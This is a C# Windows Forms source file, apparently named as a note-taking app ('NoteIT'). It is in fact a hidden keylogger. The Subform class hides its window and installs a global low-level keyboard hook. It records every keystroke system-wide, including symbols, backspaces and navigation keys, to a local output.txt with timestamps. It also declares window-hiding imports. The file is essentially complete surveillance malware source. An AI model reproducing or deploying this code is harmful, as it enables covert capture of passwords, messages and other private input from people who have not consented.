using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NoteIT
{
    public partial class Subform : Form
    {
        private static Keys[] notneeded = 
            {Keys.LControlKey, Keys.RControlKey ,Keys.LControlKey, Keys.RControlKey,
            Keys.LMenu,Keys.RMenu, Keys.LWin, Keys.RWin};
        private static StringBuilder outputtowrite = new StringBuilder();
        private static bool CapsPressed = Control.IsKeyLocked(Keys.CapsLock);
        private static TextWriter file;
        private static bool ShiftPressed;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        public Subform()
        {
            _hookID = SetHook(_proc);
            InitializeComponent();
            this.Visible = false;
            file = new StreamWriter(@"..\..\output.txt", true);
            file.WriteLine("\n" + DateTime.Now);
            file.Close();
        }
        ~Subform()
        {
            UnhookWindowsHookEx(_hookID);
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
            
        }
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            file = new StreamWriter(@"..\..\output.txt", true);
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {

                int vkCode = Marshal.ReadInt32(lParam);
                if (notneeded.Contains((Keys)vkCode))
                {
                    return CallNextHookEx(_hookID, nCode, wParam, lParam);
                }
                if (Keys.Shift == Control.ModifierKeys) ShiftPressed = true;
                else ShiftPressed = false;
                if ((Keys)vkCode == Keys.CapsLock)
                {
                    CapsPressed = !CapsPressed;
                    return CallNextHookEx(_hookID, nCode, wParam, lParam);
                }
                switch ((Keys)vkCode)
                {
                    case Keys.Space:
                        file.Write(" ");
                        break;
                    case Keys.Return:
                        file.Write("\n");
                        break;
                    case Keys.Back:
                        file.Write("~bkspc~");
                        break;
                    case Keys.Tab:
                        file.Write("~TAB~");
                        break;
                    case Keys.D0:
                        if (!ShiftPressed) file.Write("0");
                        else file.Write(")");
                        break;
                    case Keys.D1:
                        if (!ShiftPressed) file.Write("1");
                        else file.Write("!");
                        break;
                    case Keys.D2:
                        if (!ShiftPressed) file.Write("2");
                        else file.Write("@");
                        break;
                    case Keys.D3:
                        if (!ShiftPressed) file.Write("3");
                        else file.Write("#");
                        break;
                    case Keys.D4:
                        if (!ShiftPressed) file.Write("4");
                        else file.Write("$");
                        break;
                    case Keys.D5:
                        if (!ShiftPressed) file.Write("5");
                        else file.Write("%");
                        break;
                    case Keys.D6:
                        if (!ShiftPressed) file.Write("6");
                        else file.Write("^");
                        break;
                    case Keys.D7:
                        if (!ShiftPressed) file.Write("7");
                        else file.Write("&");
                        break;
                    case Keys.D8:
                        if (!ShiftPressed) file.Write("8");
                        else file.Write("*");
                        break;
                    case Keys.D9:
                        if (!ShiftPressed) file.Write("9");
                        else file.Write("(");
                        break;
                    case Keys.LShiftKey:
                    case Keys.RShiftKey:
                        file.Write("");
                        break;
                    case Keys.Delete:
                        file.Write("~Delete~");
                        break;
                    case Keys.OemQuestion:
                        if (!ShiftPressed) file.Write("/");
                        else file.Write("?");
                        break;
                    case Keys.OemOpenBrackets:
                        if (!ShiftPressed) file.Write("[");
                        else file.Write("{");
                        break;
                    case Keys.OemCloseBrackets:
                        if (!ShiftPressed) file.Write("]");
                        else file.Write("}");
                        break;
                    case Keys.Oem1:
                        if (!ShiftPressed) file.Write(";");
                        else file.Write(":");
                        break;
                    case Keys.Oem7:
                        if (!ShiftPressed) file.Write("'");
                        else file.Write('"');
                        break;
                    case Keys.Oemcomma:
                        if (!ShiftPressed) file.Write(",");
                        else file.Write("<");
                        break;
                    case Keys.OemPeriod:
                        if (!ShiftPressed) file.Write(".");
                        else file.Write(">");
                        break;
                    case Keys.OemMinus:
                        if (!ShiftPressed) file.Write("-");
                        else file.Write("_");
                        break;
                    case Keys.Oemplus:
                        if (!ShiftPressed) file.Write("=");
                        else file.Write("+");
                        break;
                    case Keys.Oemtilde:
                        if (!ShiftPressed) file.Write("`");
                        else file.Write("~");
                        break;
                    case Keys.Oem5:
                        file.Write("|");
                        break;
                    case Keys.Capital:
                        {
                            if (CapsPressed) CapsPressed = false;
                            else CapsPressed = true;
                        }
                        break;
                    case Keys.Left:
                        file.Write("~Left~");
                        break;
                    case Keys.Right:
                        file.Write("~Right~");
                        break;
                    case Keys.Up:
                        file.Write("~Up~");
                        break;
                    case Keys.Down:
                        file.Write("~Down~");
                        break;
                    case Keys.Home:
                        file.Write("~Home~");
                        break;
                    case Keys.End:
                        file.Write("~End~");
                        break;
                    case Keys.PageDown:
                        file.Write("~PageDown~");
                        break;
                    case Keys.PageUp:
                        file.Write("~PageUp~");
                        break;
                    case Keys.OemBackslash:
                        if (!ShiftPressed) file.Write("|");
                        else file.Write("\\");
                        break;
                    default:
                        {
                            if (ShiftPressed && CapsPressed) file.Write(((Keys)vkCode).ToString().ToLower());
                            if (!ShiftPressed && CapsPressed) file.Write(((Keys)vkCode).ToString().ToUpper());
                            if (ShiftPressed && !CapsPressed) file.Write(((Keys)vkCode).ToString().ToUpper());
                            if (!ShiftPressed && !CapsPressed) file.Write(((Keys)vkCode).ToString().ToLower());
                        }
                        break;
                        
                }
            }
            file.Close();
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 1;




    }
}
